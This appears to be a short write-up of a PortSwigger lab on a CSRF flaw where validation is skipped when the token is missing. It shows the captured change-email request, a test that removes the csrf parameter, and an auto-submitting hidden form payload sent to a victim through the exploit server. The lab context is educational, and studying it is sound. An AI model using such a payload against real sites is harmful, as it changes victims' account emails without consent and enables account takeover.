# Lab: CSRF where token validation depends on token being present
# https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

```bash
# Login wiener:peter and update your email to a@gmail.com
# Check change-email from burp.

POST /my-account/change-email HTTP/2
Host: x.web-security-academy.net
Cookie: session=x
User-Agent: Mozilla/x (X11; x; rv:x) Gecko/x Firefox/x.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://x.web-security-academy.net
Referer: https://x.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=a%40gmail.com&csrf=od0AvMzKftIWOhRraSzwNA5ALCIhRgCP
```

```bash
# Send to repeater. let's check will it work if we remove csrf token.
# Change email adress abcde@gmail.com.

POST /my-account/change-email HTTP/2
Host: x.web-security-academy.net
Cookie: session=x
User-Agent: Mozilla/x (X11; x; rv:x) Gecko/x Firefox/x.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://x.web-security-academy.net
Referer: https://x.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=abcde%40gmail.com

# Response:

HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0

# Follow Redirection Response:

HTTP/2 200 OK

# So we can use it this way.  
```
```bash

<form method="POST" action="https://0a56003903bd4320803b084b00f70022.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="virus@gmail.com">
</form>
<script>
	document.forms[0].submit();
</script>

# Deliver exploit to victim from exploit server.
#This works because we didn't send csrf value.
```
